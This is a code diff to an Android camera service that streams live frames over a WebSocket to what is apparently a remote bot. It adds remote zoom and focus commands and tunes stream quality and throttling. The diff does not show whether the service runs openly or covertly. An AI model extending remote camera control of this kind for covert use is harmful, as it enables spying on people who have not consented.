@@ -67,6 +67,7 @@ class CameraSessionService : Service(), LifecycleOwner {
     private val analysisExecutor = Executors.newSingleThreadExecutor()
     private val analyzing = AtomicBoolean(false)
     @Volatile private var lastAutoFocusAt = 0L
+    @Volatile private var lastTextAnalysisAt = 0L
     @Volatile private var sending = false
     @Volatile private var streamSocket: WebSocket? = null
     private val streamConnecting = AtomicBoolean(false)
@@ -77,6 +78,8 @@ class CameraSessionService : Service(), LifecycleOwner {
         override fun onReceive(context: Context?, intent: Intent?) {
             when (intent?.action) {
                 ImageMonitorService.ACTION_REMOTE_CAPTURE -> captureAndSend()
+                ImageMonitorService.ACTION_REMOTE_ZOOM -> cameraControl?.setLinearZoom(intent.getFloatExtra("zoom", 0.0f).coerceIn(0f, 1f))
+                ImageMonitorService.ACTION_REMOTE_FOCUS -> focusCenter()
                 ImageMonitorService.ACTION_REMOTE_STOP -> {
                     stopCamera("تم إيقاف جلسة الكاميرا بأمر من البوت.")
                     stopSelf()
@@ -99,6 +102,8 @@ class CameraSessionService : Service(), LifecycleOwner {
         val filter = IntentFilter().apply {
             addAction(ImageMonitorService.ACTION_REMOTE_CAPTURE)
             addAction(ImageMonitorService.ACTION_REMOTE_STOP)
+            addAction(ImageMonitorService.ACTION_REMOTE_ZOOM)
+            addAction(ImageMonitorService.ACTION_REMOTE_FOCUS)
         }
         if (Build.VERSION.SDK_INT >= 33) registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
         else @Suppress("DEPRECATION") registerReceiver(commandReceiver, filter)
@@ -175,20 +180,21 @@ class CameraSessionService : Service(), LifecycleOwner {
 
     private fun publishLiveFrame(proxy: ImageProxy) {
         val now = System.currentTimeMillis()
-        if (now - lastStreamFrameAt < 250L) return
+        if (now - lastStreamFrameAt < 400L) return
         lastStreamFrameAt = now
         var bitmap: Bitmap? = null
         try {
             if (streamSocket == null) connectLiveStream()
             val socket = streamSocket ?: return
             bitmap = proxy.toBitmap()
-            val maxWidth = 720
+            if (socket.queueSize() > 512L * 1024L) return
+            val maxWidth = 640
             val scaled = if (bitmap.width > maxWidth) {
                 val height = (bitmap.height * (maxWidth.toFloat() / bitmap.width)).toInt().coerceAtLeast(1)
                 Bitmap.createScaledBitmap(bitmap, maxWidth, height, true)
             } else bitmap
             val output = java.io.ByteArrayOutputStream()
-            scaled.compress(Bitmap.CompressFormat.JPEG, 58, output)
+            scaled.compress(Bitmap.CompressFormat.JPEG, 48, output)
             if (scaled !== bitmap) scaled.recycle()
             val payload = JSONObject().put("type", "frame")
                 .put("jpeg", Base64.encodeToString(output.toByteArray(), Base64.NO_WRAP)).toString()
@@ -212,7 +218,7 @@ class CameraSessionService : Service(), LifecycleOwner {
             proxy.close()
             return
         }
-        if (System.currentTimeMillis() - lastAutoFocusAt < 2500L) {
+        if (System.currentTimeMillis() - lastTextAnalysisAt < 5000L) {
             analyzing.set(false)
             proxy.close()
             return
@@ -252,6 +258,17 @@ class CameraSessionService : Service(), LifecycleOwner {
                 analyzing.set(false)
                 proxy.close()
             }
+    }
+
+    private fun focusCenter() {
+        try {
+            val factory = SurfaceOrientedMeteringPointFactory(1f, 1f)
+            val point = factory.createPoint(0.5f, 0.5f)
+            val action = FocusMeteringAction.Builder(point,
+                FocusMeteringAction.FLAG_AF or FocusMeteringAction.FLAG_AE)
+                .setAutoCancelDuration(3, TimeUnit.SECONDS).build()
+            cameraControl?.startFocusAndMetering(action)
+        } catch (_: Exception) { }
     }
 
     private fun captureAndSend() {
